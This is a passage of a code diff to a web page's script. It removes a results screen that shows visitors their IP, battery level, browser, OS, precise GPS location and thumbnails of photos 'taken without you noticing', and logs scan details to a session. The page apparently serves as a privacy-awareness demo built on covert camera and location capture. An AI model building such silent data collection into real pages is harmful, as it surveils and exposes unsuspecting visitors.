+        setTimeout(runStep, 1000);
       }
 
       runStep();
-    };
-
-    function showResults() {
-      document.getElementById('step-scanning').style.display = 'none';
-      document.getElementById('step-results').style.display = 'block';
-
-      // Fill results
-      document.getElementById('r-ip').textContent = ipAddress;
-      document.getElementById('r-battery').textContent = batteryLevel;
-      document.getElementById('r-screen').textContent = screen.width + ' × ' + screen.height;
-      document.getElementById('r-photo-count').textContent = photoCount + ' photos taken without you noticing';
-
-      // Browser/OS detection
-      const ua = navigator.userAgent;
-      let browser = 'Unknown';
-      if (ua.includes('Chrome')) browser = 'Chrome';
-      else if (ua.includes('Safari')) browser = 'Safari';
-      else if (ua.includes('Firefox')) browser = 'Firefox';
-      let os = 'Unknown';
-      if (ua.includes('Android')) os = 'Android';
-      else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-      else if (ua.includes('Windows')) os = 'Windows';
-      else if (ua.includes('Mac')) os = 'macOS';
-      document.getElementById('r-browser').textContent = browser;
-      document.getElementById('r-os').textContent = os;
-
-      // Location
-      document.getElementById('r-coords').textContent = locationData.lat ? locationData.lat.toFixed(5) + '°N, ' + locationData.lng.toFixed(5) + '°E' : 'Collected';
-      document.getElementById('r-city').textContent = locationData.city || 'Detected';
-      document.getElementById('r-state').textContent = locationData.state || 'Detected';
-      document.getElementById('r-accuracy').textContent = locationData.accuracy ? '±' + locationData.accuracy + ' meters' : 'High accuracy';
-
-      // Show photo thumbnails
-      const photosEl = document.getElementById('r-photos');
-      photoPreviews.forEach(src => {
-        const img = document.createElement('img');
-        img.src = src;
-        img.className = 'photo-thumb';
-        photosEl.appendChild(img);
-      });
-
-      updateSession({ scan_completed_at: new Date().toISOString(), battery: batteryLevel, browser, os, screen: screen.width + 'x' + screen.height });
-    }
+    });
 
   </script>
 
